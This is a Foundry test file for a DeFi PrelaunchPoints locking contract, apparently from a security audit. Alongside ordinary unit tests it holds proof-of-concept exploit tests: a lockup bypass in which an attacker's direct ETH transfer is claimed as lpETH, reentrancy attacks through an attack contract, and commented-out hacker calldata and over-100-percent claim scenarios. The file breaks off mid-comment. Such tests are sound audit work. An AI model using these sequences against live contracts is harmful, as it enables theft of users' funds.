// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PrelaunchPoints.sol";
import "../src/interfaces/ILpETH.sol";

import "../src/mock/AttackContract.sol";
import "../src/mock/MockLpETH.sol";
import "../src/mock/MockLpETHVault.sol";
import {ERC20Token} from "../src/mock/MockERC20.sol";
import {LRToken} from "../src/mock/MockLRT.sol";

import "forge-std/console.sol";

contract PrelaunchPointsTest is Test {
    PrelaunchPoints public prelaunchPoints;
    AttackContract public attackContract;
    ILpETH public lpETH;
    LRToken public lrt;
    ILpETHVault public lpETHVault;
    uint256 public constant INITIAL_SUPPLY = 1000 ether;
    bytes32 referral = bytes32(uint256(1));

    address constant EXCHANGE_PROXY = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address[] public allowedTokens;

    function setUp() public {
        // string memory mainnetRpcUrl = vm.envString("MAINNET_RPC_URL");
        // uint256 forkId = vm.createFork(mainnetRpcUrl, 19797321);
        // vm.selectFork(forkId);
        // assertEq(block.number, 19797321);

        lrt = new LRToken();
        lrt.mint(address(this), INITIAL_SUPPLY);

        address[] storage allowedTokens_ = allowedTokens;
        allowedTokens_.push(address(lrt));

        prelaunchPoints = new PrelaunchPoints(EXCHANGE_PROXY, WETH, allowedTokens_);

        lpETH = new MockLpETH();
        lpETHVault = new MockLpETHVault();

        attackContract = new AttackContract(prelaunchPoints);
    }

    function test_deposit_lockup_bypass() public {
        uint256 lockAmount = 1;
        address attacker = makeAddr("attacker");

        vm.startPrank(attacker);
        lrt.mint(attacker, lockAmount);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, "");
        vm.stopPrank();

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        // Locking period ends
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();
        vm.warp(prelaunchPoints.startClaimDate() + 1);

        uint256 largeEthAmount = 10 ether;
        vm.deal(attacker, largeEthAmount);
        vm.startPrank(attacker);
        (bool success,) = address(prelaunchPoints).call{value: largeEthAmount}("");
        require(success, "Call failed");
        prelaunchPoints.claim(
            address(lrt),
            uint8(lockAmount),
            PrelaunchPoints.Exchange.TransformERC20,
            abi.encodeWithSelector(prelaunchPoints.TRANSFORM_SELECTOR(), address(lrt), address(ETH), lockAmount / 100)
        );
        vm.stopPrank();

        uint256 attackerEndingBalance = lpETH.balanceOf(attacker);
        assertEq(attackerEndingBalance, largeEthAmount);
    }

    /// ======= Tests for lockETH ======= ///
    function testLockETH(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        assertEq(prelaunchPoints.balances(address(this), ETH), lockAmount);
        assertEq(prelaunchPoints.totalSupply(), lockAmount);
    }

    function testLockETHFailActivation(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        // Should revert after setting the loop addresses
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        vm.deal(address(this), lockAmount);
        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunchPoints.lockETH{value: lockAmount}(referral);
    }

    function testLockETHFailZero() public {
        vm.expectRevert(PrelaunchPoints.CannotLockZero.selector);
        prelaunchPoints.lockETH{value: 0}(referral);
    }

    /// ======= Tests for lockETHFor ======= ///
    function testLockETHFor(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        address recipient = address(0x1234);

        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETHFor{value: lockAmount}(recipient, referral);

        assertEq(prelaunchPoints.balances(recipient, ETH), lockAmount);
        assertEq(prelaunchPoints.totalSupply(), lockAmount);
    }

    function testLockETHForFailActivation(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        address recipient = address(0x1234);
        // Should revert after setting the loop addresses
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        vm.deal(address(this), lockAmount);
        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunchPoints.lockETHFor{value: lockAmount}(recipient, referral);
    }

    function testLockETHForFailZero() public {
        address recipient = address(0x1234);

        vm.expectRevert(PrelaunchPoints.CannotLockZero.selector);
        prelaunchPoints.lockETHFor{value: 0}(recipient, referral);
    }

    /// ======= Tests for lock ======= ///
    function testLock(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);

        assertEq(prelaunchPoints.balances(address(this), address(lrt)), lockAmount);
    }

    function testLockailActivation(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        // Should revert after setting the loop addresses
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        vm.deal(address(this), lockAmount);
        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);
    }

    function testLockFailZero() public {
        vm.expectRevert(PrelaunchPoints.CannotLockZero.selector);
        prelaunchPoints.lock(address(lrt), 0, referral);
    }

    function testLockFailTokenNotAllowed(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        vm.expectRevert(PrelaunchPoints.TokenNotAllowed.selector);
        prelaunchPoints.lock(address(lpETH), lockAmount, referral);
    }

    /// ======= Tests for lockFor ======= ///
    function testLockFor(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        address recipient = address(0x1234);

        prelaunchPoints.lockFor(address(lrt), lockAmount, recipient, referral);

        assertEq(prelaunchPoints.balances(recipient, address(lrt)), lockAmount);
    }

    function testLockForFailActivation(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        address recipient = address(0x1234);
        // Should revert after setting the loop addresses
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        lrt.approve(address(prelaunchPoints), lockAmount);
        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunchPoints.lockFor(address(lrt), lockAmount, recipient, referral);
    }

    function testLockForFailZero() public {
        address recipient = address(0x1234);

        vm.expectRevert(PrelaunchPoints.CannotLockZero.selector);
        prelaunchPoints.lockFor(address(lrt), 0, recipient, referral);
    }

    function testLockForFailTokenNotAllowed(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        address recipient = address(0x1234);

        vm.expectRevert(PrelaunchPoints.TokenNotAllowed.selector);
        prelaunchPoints.lockFor(address(lpETH), lockAmount, recipient, referral);
    }

    /// ======= Tests for convertAllETH ======= ///
    function testConvertAllETH(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        assertEq(prelaunchPoints.totalLpETH(), lockAmount);
        assertEq(lpETH.balanceOf(address(prelaunchPoints)), lockAmount);
        assertEq(prelaunchPoints.startClaimDate(), block.timestamp);
    }

    function testConvertAllFailActivation(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        vm.expectRevert(PrelaunchPoints.LoopNotActivated.selector);
        prelaunchPoints.convertAllETH();
    }

    /// ======= Tests for claim ETH======= ///
    bytes emptydata = new bytes(1);

    function testClaim(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);

        uint256 balanceLpETH = prelaunchPoints.totalLpETH() * lockAmount / prelaunchPoints.totalSupply();

        assertEq(prelaunchPoints.balances(address(this), ETH), 0);
        assertEq(lpETH.balanceOf(address(this)), balanceLpETH);
    }

    function testClaimSeveralUsers(uint256 lockAmount, uint256 lockAmount1, uint256 lockAmount2) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        lockAmount1 = bound(lockAmount1, 1, 1e36);
        lockAmount2 = bound(lockAmount2, 1, 1e36);

        address user1 = vm.addr(1);
        address user2 = vm.addr(2);

        vm.deal(address(this), lockAmount);
        vm.deal(user1, lockAmount1);
        vm.deal(user2, lockAmount2);

        prelaunchPoints.lockETH{value: lockAmount}(referral);
        vm.prank(user1);
        prelaunchPoints.lockETH{value: lockAmount1}(referral);
        vm.prank(user2);
        prelaunchPoints.lockETH{value: lockAmount2}(referral);

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);

        uint256 balanceLpETH = prelaunchPoints.totalLpETH() * lockAmount / prelaunchPoints.totalSupply();

        assertEq(prelaunchPoints.balances(address(this), ETH), 0);
        assertEq(lpETH.balanceOf(address(this)), balanceLpETH);

        vm.prank(user1);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
        uint256 balanceLpETH1 = prelaunchPoints.totalLpETH() * lockAmount1 / prelaunchPoints.totalSupply();

        assertEq(prelaunchPoints.balances(user1, ETH), 0);
        assertEq(lpETH.balanceOf(user1), balanceLpETH1);
    }

    function testClaimFailTwice(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);

        vm.expectRevert(PrelaunchPoints.NothingToClaim.selector);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
    }

    function testClaimFailBeforeConvert(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);

        vm.expectRevert(PrelaunchPoints.CurrentlyNotPossible.selector);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
    }

    /// ======= Tests for claimAndStake ======= ///
    function testClaimAndStake(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);
        prelaunchPoints.claimAndStake(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);

        uint256 balanceLpETH = prelaunchPoints.totalLpETH() * lockAmount / prelaunchPoints.totalSupply();

        assertEq(prelaunchPoints.balances(address(this), ETH), 0);
        assertEq(lpETH.balanceOf(address(this)), 0);
        assertEq(lpETHVault.balanceOf(address(this)), balanceLpETH);
    }

    function testClaimAndStakeSeveralUsers(uint256 lockAmount, uint256 lockAmount1, uint256 lockAmount2) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        lockAmount1 = bound(lockAmount1, 1, 1e36);
        lockAmount2 = bound(lockAmount2, 1, 1e36);

        address user1 = vm.addr(1);
        address user2 = vm.addr(2);

        vm.deal(address(this), lockAmount);
        vm.deal(user1, lockAmount1);
        vm.deal(user2, lockAmount2);

        prelaunchPoints.lockETH{value: lockAmount}(referral);
        vm.prank(user1);
        prelaunchPoints.lockETH{value: lockAmount1}(referral);
        vm.prank(user2);
        prelaunchPoints.lockETH{value: lockAmount2}(referral);

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);
        prelaunchPoints.claimAndStake(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);

        uint256 balanceLpETH = prelaunchPoints.totalLpETH() * lockAmount / prelaunchPoints.totalSupply();

        assertEq(prelaunchPoints.balances(address(this), ETH), 0);
        assertEq(lpETH.balanceOf(address(this)), 0);
        assertEq(lpETHVault.balanceOf(address(this)), balanceLpETH);

        vm.prank(user1);
        prelaunchPoints.claimAndStake(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
        uint256 balanceLpETH1 = prelaunchPoints.totalLpETH() * lockAmount1 / prelaunchPoints.totalSupply();

        assertEq(prelaunchPoints.balances(user1, ETH), 0);
        assertEq(lpETH.balanceOf(user1), 0);
        assertEq(lpETHVault.balanceOf(user1), balanceLpETH1);
    }

    function testClaimAndStakeFailTwice(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);

        vm.expectRevert(PrelaunchPoints.NothingToClaim.selector);
        prelaunchPoints.claimAndStake(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
    }

    function testClaimAndStakeFailBeforeConvert(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);

        vm.expectRevert(PrelaunchPoints.CurrentlyNotPossible.selector);
        prelaunchPoints.claimAndStake(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
    }

    /// ======= Tests for withdraw ETH ======= ///
    receive() external payable {}

    function testWithdrawETH(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + 1);
        prelaunchPoints.withdraw(ETH);

        assertEq(prelaunchPoints.balances(address(this), ETH), 0);
        assertEq(prelaunchPoints.totalSupply(), 0);
        assertEq(address(this).balance, lockAmount);
    }

    function testWithdrawETHFailBeforeActivation(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        vm.expectRevert(PrelaunchPoints.CurrentlyNotPossible.selector);
        prelaunchPoints.withdraw(ETH);
    }

    function testWithdrawETHBeforeActivationEmergencyMode(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        prelaunchPoints.setEmergencyMode(true);

        prelaunchPoints.withdraw(ETH);
        assertEq(prelaunchPoints.balances(address(this), ETH), 0);
        assertEq(prelaunchPoints.totalSupply(), 0);
        assertEq(address(this).balance, lockAmount);
    }

    function testWithdrawETHFailAfterConvert(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunchPoints.withdraw(ETH);
    }

    function testWithdrawETHFailNotReceive(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        vm.deal(address(lpETHVault), lockAmount);
        vm.prank(address(lpETHVault)); // Contract withiut receive
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + 1);

        vm.prank(address(lpETHVault));
        vm.expectRevert(PrelaunchPoints.FailedToSendEther.selector);
        prelaunchPoints.withdraw(ETH);
    }

    /// ======= Tests for withdraw ======= ///
    function testWithdraw(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);

        uint256 balanceBefore = lrt.balanceOf(address(this));

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + 1);
        prelaunchPoints.withdraw(address(lrt));

        assertEq(prelaunchPoints.balances(address(this), address(lrt)), 0);
        assertEq(lrt.balanceOf(address(this)) - balanceBefore, lockAmount);
    }

    function testWithdrawFailBeforeActivation(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);

        vm.expectRevert(PrelaunchPoints.CurrentlyNotPossible.selector);
        prelaunchPoints.withdraw(address(lrt));
    }

    function testWithdrawBeforeActivationEmergencyMode(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);

        uint256 balanceBefore = lrt.balanceOf(address(this));

        prelaunchPoints.setEmergencyMode(true);

        prelaunchPoints.withdraw(address(lrt));
        assertEq(prelaunchPoints.balances(address(this), address(lrt)), 0);
        assertEq(lrt.balanceOf(address(this)) - balanceBefore, lockAmount);
    }

    function testWithdrawFailAfterConvert(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunchPoints.withdraw(address(this));
    }

    function testWithdrawAfterConvertEmergencyMode(uint256 lockAmount) public {
        lockAmount = bound(lockAmount, 1, INITIAL_SUPPLY);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);

        uint256 balanceBefore = lrt.balanceOf(address(this));

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        prelaunchPoints.setEmergencyMode(true);

        prelaunchPoints.withdraw(address(lrt));
        assertEq(prelaunchPoints.balances(address(this), address(lrt)), 0);
        assertEq(lrt.balanceOf(address(this)) - balanceBefore, lockAmount);
    }

    /// ======= Tests for recoverERC20 ======= ///
    function testRecoverERC20() public {
        ERC20Token token = new ERC20Token();
        uint256 amount = 100 ether;
        token.mint(address(prelaunchPoints), amount);

        prelaunchPoints.recoverERC20(address(token), amount);

        assertEq(token.balanceOf(prelaunchPoints.owner()), amount);
        assertEq(token.balanceOf(address(prelaunchPoints)), 0);
    }

    function testRecoverERC20FailLpETH(uint256 amount) public {
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        vm.expectRevert(PrelaunchPoints.NotValidToken.selector);
        prelaunchPoints.recoverERC20(address(lpETH), amount);
    }

    function testRecoverERC20FailLRT(uint256 amount) public {
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        vm.expectRevert(PrelaunchPoints.NotValidToken.selector);
        prelaunchPoints.recoverERC20(address(lrt), amount);
    }

    /// ======= Tests for SetLoopAddresses ======= ///
    function testSetLoopAddressesFailTwice() public {
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
    }

    function testSetLoopAddressesFailAfterDeadline(uint256 lockAmount) public {
        vm.assume(lockAmount > 0);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        vm.warp(prelaunchPoints.loopActivation() + 1);

        vm.expectRevert(PrelaunchPoints.NoLongerPossible.selector);
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
    }

    /// ======= Tests for SetOwner ======= ///
    function testSetOwner() public {
        address user1 = vm.addr(1);
        prelaunchPoints.setOwner(user1);

        assertEq(prelaunchPoints.owner(), user1);
    }

    function testSetOwnerFailNotAuthorized() public {
        address user1 = vm.addr(1);
        vm.prank(user1);
        vm.expectRevert(PrelaunchPoints.NotAuthorized.selector);
        prelaunchPoints.setOwner(user1);
    }

    /// ======= Tests for SetEmergencyMode ======= ///
    function testSetEmergencyMode() public {
        prelaunchPoints.setEmergencyMode(true);

        assertEq(prelaunchPoints.emergencyMode(), true);
    }

    function testSetEmergencyModeFailNotAuthorized() public {
        address user1 = vm.addr(1);
        vm.prank(user1);
        vm.expectRevert(PrelaunchPoints.NotAuthorized.selector);
        prelaunchPoints.setEmergencyMode(true);
    }

    /// ======= Tests for AllowToken ======= ///
    function testAllowToken() public {
        prelaunchPoints.allowToken(ETH);

        assertEq(prelaunchPoints.isTokenAllowed(ETH), true);
    }

    function testAllowTokenFailNotAuthorized() public {
        address user1 = vm.addr(1);
        vm.prank(user1);
        vm.expectRevert(PrelaunchPoints.NotAuthorized.selector);
        prelaunchPoints.allowToken(ETH);
    }

    /// ======= Reentrancy Tests ======= ///
    function testReentrancyOnWithdraw() public {
        uint256 lockAmount = 1 ether;

        vm.deal(address(this), lockAmount);
        vm.prank(address(this));
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        vm.warp(prelaunchPoints.loopActivation() + 1 days);
        vm.prank(address(attackContract));
        vm.expectRevert();
        attackContract.attackWithdraw();
    }

    function testReentrancyOnClaim() public {
        uint256 lockAmount = 1 ether;

        vm.deal(address(this), lockAmount);
        vm.prank(address(this));
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1 days);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1 days);
        vm.prank(address(attackContract));
        vm.expectRevert();
        attackContract.attackClaim();
    }

    /*//////////////////////////////////////////////////////////////
                                 AUDIT
    //////////////////////////////////////////////////////////////*/

    function test_deposits_after_lpEth_set() public {
        vm.prank(prelaunchPoints.owner());
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));

        address user = makeAddr("user");
        vm.deal(user, 1 ether);
        vm.prank(user);
        vm.expectRevert();
        prelaunchPoints.lockETH{value: 1 ether}("");
    }

    function test_calldata_uniswap() public {}

    // function test_calldata_claim_uniswap(uint256 lockAmount) public {
    //     address hacker = makeAddr("hacker");

    //     lockAmount = bound(lockAmount, 1, 1e36);
    //     vm.deal(address(this), lockAmount);
    //     prelaunchPoints.lockETH{value: lockAmount}(referral);

    //     // Set Loop Contracts and Convert to lpETH
    //     prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
    //     vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
    //     prelaunchPoints.convertAllETH();

    //     bytes memory data =
    //         abi.encodeWithSelector(UNI_SELECTOR, address(lrt), prelaunchPoints.WETH(), lockAmount, hacker);

    //     vm.warp(prelaunchPoints.startClaimDate() + 1);
    //     prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, data);

    //     uint256 balanceLpETH = prelaunchPoints.totalLpETH() * lockAmount / prelaunchPoints.totalSupply();

    //     assertEq(prelaunchPoints.balances(address(this), ETH), 0);
    //     assertEq(lpETH.balanceOf(address(this)), balanceLpETH);

    //     uint256 hackerBalance = lrt.balanceOf(hacker);
    //     console.log("hackerBalance:", hackerBalance);
    // }

    function test_claim_0_percent(uint256 lockAmount) public {
        uint8 ZERO_PERCENT = 0;

        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);

        uint256 startingUserBalance = prelaunchPoints.balances(address(this), prelaunchPoints.ETH());
        uint256 startingContractBalance = address(prelaunchPoints).balance;

        // Set Loop Contracts and Convert to lpETH
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        prelaunchPoints.convertAllETH();

        vm.warp(prelaunchPoints.startClaimDate() + 1);

        // After setting loop addresses and warping
        uint256 beforeClaimLpETHBalance = lpETH.balanceOf(address(this));
        uint256 beforeClaimUserETHBalance = prelaunchPoints.balances(address(this), ETH);

        prelaunchPoints.claim(ETH, ZERO_PERCENT, PrelaunchPoints.Exchange.UniswapV3, emptydata);

        uint256 afterClaimLpETHBalance = lpETH.balanceOf(address(this));
        uint256 afterClaimUserETHBalance = prelaunchPoints.balances(address(this), ETH);

        assertEq(beforeClaimLpETHBalance, afterClaimLpETHBalance, "LP ETH balance should not change");
        assertEq(beforeClaimUserETHBalance, afterClaimUserETHBalance, "User's ETH balance should not change");

        // uint256 balanceLpETH = prelaunchPoints.totalLpETH() * lockAmount / prelaunchPoints.totalSupply();

        // assertEq(prelaunchPoints.balances(address(this), ETH), 0);
        // assertEq(lpETH.balanceOf(address(this)), balanceLpETH);

        // uint256 endingUserBalance = prelaunchPoints.balances(address(this), prelaunchPoints.ETH());
        // uint256 endingContractBalance = address(prelaunchPoints).balance;

        // console.log("startingUserBalance:", startingUserBalance);
        // console.log("endingUserBalance:", endingUserBalance);
        // console.log("startingContractBalance:", startingContractBalance);
        // console.log("endingContractBalance:", endingContractBalance);
        // console.log("balanceLpETH:", balanceLpETH);
    }

    // function test_claim_percent_exploit(uint256 userLockAmount, uint256 hackerLockAmount) public {
    //     uint8 TWO_HUNDRED_PERCENT = 200;
    //     address hacker = makeAddr("hacker");

    //     // Bound the lock amounts within realistic limits
    //     userLockAmount = bound(userLockAmount, 1, 1e36);
    //     hackerLockAmount = bound(hackerLockAmount, 1, 1e36);

    //     // Provide initial ETH to users
    //     vm.deal(address(this), userLockAmount);
    //     vm.deal(hacker, hackerLockAmount);

    //     // Both the legitimate user and hacker lock their ETH
    //     prelaunchPoints.lockETH{value: userLockAmount}(referral);
    //     vm.prank(hacker);
    //     prelaunchPoints.lockETH{value: hackerLockAmount}(referral);

    //     // Set Loop Contracts and Convert to lpETH
    //     prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
    //     vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
    //     prelaunchPoints.convertAllETH();

    //     // Warp to after the claim start date
    //     vm.warp(prelaunchPoints.startClaimDate() + 1);

    //     // Check balances before claim
    //     uint256 beforeClaimUserLpETHBalance = lpETH.balanceOf(address(this));
    //     uint256 beforeClaimHackerLpETHBalance = lpETH.balanceOf(hacker);

    //     // Hacker tries to claim 200%
    //     vm.prank(hacker);
    //     prelaunchPoints.claim(ETH, TWO_HUNDRED_PERCENT + 33, PrelaunchPoints.Exchange.UniswapV3, emptydata);

    //     // Check balances after claim
    //     uint256 afterClaimUserLpETHBalance = lpETH.balanceOf(address(this));
    //     uint256 afterClaimHackerLpETHBalance = lpETH.balanceOf(hacker);

    //     // Assertions to ensure no unauthorized transfers occur
